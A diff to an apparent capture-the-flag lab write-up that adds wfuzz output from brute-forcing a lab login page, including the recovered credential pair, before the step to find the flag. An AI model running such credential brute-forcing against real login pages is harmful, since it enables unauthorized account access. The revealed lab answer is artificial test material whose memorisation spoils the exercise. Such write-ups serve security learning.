@@ -44,6 +44,30 @@ Now bruteforce the Credentials using wfuzz with the command —
 
     wfuzz -c -z file,usernames.txt -z file,passwords.txt — hs “Please enter the correct credentials” -u http://MACHINE-IP/login.php -d “username=FUZZ&password=FUZ2Z”
 
+```
+╰─ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.1.59/login.php -d "username=FUZZ&password=FUZ2Z"      ─╯
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.1.59/login.php
+Total requests: 9324
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                     
+=====================================================================
+
+000006292:   302        118 L    297 W      4442 Ch     "isaias - Happiness"                                                                                        
+
+Total time: 0
+Processed Requests: 9324
+Filtered Requests: 9323
+Requests/sec.: 0
+
+
+```
+
 ### 2. What is the Flag?
 
 Log in and click on the Email with the Subject “Confidential Message”
